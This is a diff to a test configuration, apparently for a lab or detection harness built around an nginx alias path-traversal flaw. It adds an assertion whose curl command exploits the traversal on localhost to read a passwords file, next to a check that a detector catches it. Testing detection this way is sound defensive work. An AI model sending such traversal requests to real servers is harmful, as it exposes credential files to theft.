@@ -17,6 +17,12 @@ ready:
   interval: 2s
 
 assertions:
+  - name: exploit-alias-traversal-reads-secret
+    type: command
+    expect:
+      command: "curl -sf http://localhost:9209/static../secret/passwords.txt | grep -q hunter2"
+      exit_code: 0
+
   - name: detects-nginx-alias-traversal
     type: beacon
     target: nginx:80
